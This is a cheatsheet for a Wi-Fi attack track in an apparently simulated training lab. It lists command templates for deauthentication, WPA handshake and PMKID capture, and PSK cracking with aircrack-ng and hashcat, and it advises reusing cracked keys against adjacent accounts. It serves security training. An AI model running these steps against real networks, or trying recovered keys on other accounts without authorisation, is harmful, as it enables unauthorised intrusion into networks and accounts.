# Wireless — Track Cheatsheet

## The toolchain

| Task | Tool |
|---|---|
| Radios/phys | `iw dev`, `iw phy` |
| Monitor mode | `airmon-ng start wlanX` / `iw set type monitor` |
| Survey | `airodump-ng wlanXmon` |
| Capture | `airodump-ng -c CH --bssid AP -w out` |
| Deauth | `aireplay-ng -0 N -a AP -c CLIENT` |
| Crack | `aircrack-ng -w list.cap` / `hashcat -m 22000` |
| PMKID | `hcxdumptool` → `hcxpcapngtool -o *.22000` |

## Attack paths

| Path | Client needed? | Noise |
|---|---|---|
| Offline crack of saved .cap | — | silent |
| Deauth → handshake | yes | loud burst |
| PMKID harvest | no | quiet probe |
| Rogue detection | — | passive survey |

## hwsim lab layout (all wifi quests)

```
wifilab01 (10.x.10.25)
├── wlan0  → hosts AP (hostapd)
├── wlan1  → YOUR attack radio
├── wlan2  → AP #2 or client (quest-dependent)
└── wlan3  → extra client (t3-exam)
```

`sudo` available on the lab user. If interfaces get stuck:
`sudo iw dev <mon> del` or re-`modprobe` (role handles it).

**Working style.** Prefer one-shot commands (`ssh wifi@wifilab01
'sudo airodump-ng ...'`) or `scp` captures back to kali for cracking —
your coach tracks kali-side commands and can't see inside an
interactive ssh session. Heavy cracking (hashcat) is also faster on
kali than on the little lab box.

## The recurring lesson

A crackable PSK is a crackable everything — the lab accounts reuse the
PSKs *on purpose*. In real audits, always try recovered wireless keys
against adjacent accounts and encrypted artifacts.
